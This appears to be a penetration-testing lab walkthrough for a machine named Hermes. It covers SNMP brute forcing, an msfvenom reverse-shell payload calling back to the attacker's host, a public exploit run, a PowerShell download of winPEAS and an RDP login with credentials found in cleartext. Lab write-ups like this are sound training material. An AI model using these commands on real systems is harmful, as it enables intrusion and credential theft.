# Hermes Standalone

I start off by scanning open ports:

<figure><img src="../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

On port 161 we discover a SNMP port open and we manage to bruteforce the password:

<figure><img src="../../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

So after enumerating for a bit i found this program running with snmp:

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I look up exploits and find what i'm looking for:

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

after looking what the payload does i generate a shell.exe file:

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.207 -f exe -o shell.exe
```

and run the exploit after hostinf a python server:

```
python 50972.py 192.168.243.145 192.168.45.207:80 shell.exe
```

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i transfer powershell:

```
powershell
Invoke-WebRequest "http://192.168.45.207/winPEASany.exe" -OutFile "C:\Users\offsec\Desktop\winpeas.exe"
```

After running a linpeas i found some cleartext credentials:

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption><p>zachary:Th3R@tC@tch3r</p></figcaption></figure>

I'm able to connect via RDP to the machine and while enumerating:

```
xfreerdp /v:192.168.243.145 /u:zachary /p:Th3R@tC@tch3r
```

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i'm able to launch shell as administrator:

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
